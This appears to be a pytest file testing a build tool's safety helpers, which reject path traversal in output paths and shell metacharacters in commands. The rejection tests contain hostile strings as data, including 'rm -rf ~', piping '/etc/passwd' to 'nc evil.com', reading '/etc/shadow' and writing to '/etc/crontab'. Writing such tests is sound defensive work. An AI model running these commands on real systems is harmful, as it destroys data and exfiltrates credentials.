"""Tests for path traversal rejection and command injection rejection."""

import pytest

from build_loop.safety import (
    PathTraversalError,
    UnsafeCommandError,
    safe_command,
    safe_output_path,
)


# =========================================================================
# Path traversal rejection
# =========================================================================

class TestSafeOutputPath:
    """safe_output_path must reject anything that escapes the project root."""

    def test_simple_relative_path(self, tmp_path):
        result = safe_output_path(tmp_path, "src/main.py")
        assert result == tmp_path / "src" / "main.py"

    def test_nested_relative_path(self, tmp_path):
        result = safe_output_path(tmp_path, "a/b/c/d.txt")
        assert result == tmp_path / "a" / "b" / "c" / "d.txt"

    def test_rejects_absolute_path(self, tmp_path):
        with pytest.raises(PathTraversalError, match="Absolute path"):
            safe_output_path(tmp_path, "/tmp/x.py")

    def test_rejects_dotdot_traversal(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            safe_output_path(tmp_path, "../../.zshrc")

    def test_rejects_dotdot_in_middle(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            safe_output_path(tmp_path, "src/../../etc/passwd")

    def test_rejects_dotdot_at_start(self, tmp_path):
        with pytest.raises(PathTraversalError, match="traversal"):
            safe_output_path(tmp_path, "../sibling/file.py")

    def test_rejects_empty_path(self, tmp_path):
        with pytest.raises(PathTraversalError, match="Empty"):
            safe_output_path(tmp_path, "")

    def test_rejects_null_bytes(self, tmp_path):
        with pytest.raises(PathTraversalError, match="illegal characters"):
            safe_output_path(tmp_path, "foo\x00bar.py")

    def test_rejects_windows_absolute(self, tmp_path):
        with pytest.raises(PathTraversalError, match="Absolute path"):
            safe_output_path(tmp_path, "\\Windows\\system32\\evil.exe")

    def test_allows_dotfile(self, tmp_path):
        """Dotfiles like .gitignore are fine — only .. is forbidden."""
        result = safe_output_path(tmp_path, ".gitignore")
        assert result == tmp_path / ".gitignore"

    def test_allows_hidden_directory(self, tmp_path):
        result = safe_output_path(tmp_path, ".config/settings.json")
        assert result == tmp_path / ".config" / "settings.json"


# =========================================================================
# Command injection rejection
# =========================================================================

class TestSafeCommand:
    """safe_command must reject shell metacharacters and parse cleanly."""

    def test_simple_command(self):
        assert safe_command("pytest -v") == ["pytest", "-v"]

    def test_command_with_path(self):
        assert safe_command(".venv/bin/pip install requests") == [
            ".venv/bin/pip", "install", "requests"
        ]

    def test_rejects_semicolon_injection(self):
        with pytest.raises(UnsafeCommandError, match="metacharacters"):
            safe_command("pip install foo; rm -rf ~")

    def test_rejects_pipe(self):
        with pytest.raises(UnsafeCommandError, match="metacharacters"):
            safe_command("cat /etc/passwd | nc evil.com 1234")

    def test_rejects_ampersand(self):
        with pytest.raises(UnsafeCommandError, match="metacharacters"):
            safe_command("pip install foo && curl evil.com")

    def test_rejects_backtick(self):
        with pytest.raises(UnsafeCommandError, match="metacharacters"):
            safe_command("echo `whoami`")

    def test_rejects_dollar_expansion(self):
        with pytest.raises(UnsafeCommandError, match="metacharacters"):
            safe_command("echo $(cat /etc/shadow)")

    def test_rejects_redirect(self):
        with pytest.raises(UnsafeCommandError, match="metacharacters"):
            safe_command("echo evil > /etc/crontab")

    def test_rejects_empty(self):
        with pytest.raises(UnsafeCommandError, match="Empty"):
            safe_command("")

    def test_allows_quoted_strings(self):
        result = safe_command('python -c "print(1)"')
        assert result == ["python", "-c", "print(1)"]

    def test_allows_flags_with_equals(self):
        result = safe_command("pytest --timeout=30 -v")
        assert result == ["pytest", "--timeout=30", "-v"]

    def test_allows_paths_with_dots(self):
        result = safe_command(".venv/bin/python main.py")
        assert result == [".venv/bin/python", "main.py"]
